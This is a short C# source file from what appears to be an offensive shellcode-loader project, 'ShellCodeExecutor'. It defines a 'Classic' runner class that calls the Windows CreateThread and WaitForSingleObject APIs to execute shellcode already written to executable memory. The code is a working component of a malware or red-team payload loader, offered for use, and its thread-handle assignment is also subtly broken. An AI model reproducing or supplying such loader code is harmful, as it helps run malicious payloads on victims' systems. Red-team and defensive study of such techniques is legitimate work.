using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Runtime.InteropServices;

namespace ShellCodeExecutor
{
    internal class ClassicShellCodeRunner : IShellCodeRunner
    {

        [DllImport("kernel32")]
        private static extern IntPtr CreateThread(IntPtr lpThreadAttributes, UInt32 dwStackSize, IntPtr lpStartAddress, IntPtr param, UInt32 dwCreationFlags, out IntPtr lpThreadId);
        
        [DllImport("kernel32")]
        private static extern UInt32 WaitForSingleObject(IntPtr hHandle, UInt32 dwMilliseconds);
        public void RunShellCode(IntPtr rwxMemory)
        {
            IntPtr shellCodeThread = CreateThread(IntPtr.Zero, 0, rwxMemory, IntPtr.Zero, 0, out shellCodeThread);
            WaitForSingleObject(shellCodeThread, 0xFFFFFFFF);
        }
        override
        public String ToString()
        {
            return "Classic";
        }
    }
}
